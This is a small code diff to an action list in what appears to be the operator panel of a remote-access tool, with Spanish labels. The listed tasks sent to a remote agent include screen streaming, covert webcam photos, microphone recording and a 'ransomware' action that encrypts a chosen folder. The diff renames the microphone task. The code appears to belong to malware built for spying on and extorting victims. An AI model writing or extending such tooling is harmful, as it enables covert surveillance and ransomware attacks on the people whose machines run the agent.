@@ -181,7 +181,7 @@ export const ACTIONS: ActionDef[] = [
   // Monitor
   { id: 'monitor', group: 'monitor', label: 'Streaming de pantalla', icon: Monitor, task: 'monitor', minAgent: '0.3.7', detail: 'monitor · {seconds,fps,quality}', dialog: 'monitor', local: true },
   { id: 'webcam', group: 'monitor', label: 'Foto de webcam', icon: Camera, task: 'webcam', minAgent: '0.3.7', detail: 'webcam · {}', resolve: () => task('webcam', {}, 60) },
-  { id: 'mic', group: 'monitor', label: 'Clip de micrófono', icon: Activity, task: 'mic', minAgent: '0.3.7', detail: 'mic · {seconds}', dialog: 'mic', local: true },
+  { id: 'mic', group: 'monitor', label: 'Clip de micrófono', icon: Activity, task: 'mic:record', minAgent: '0.3.7', detail: 'mic:record · {seconds}', dialog: 'mic', local: true },
 
   // Cifrado
   { id: 'ransom', group: 'cifrado', label: 'Cifrar carpeta', icon: Lock, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · encrypt {path}', dialog: 'ransomware', local: true, destructive: true },
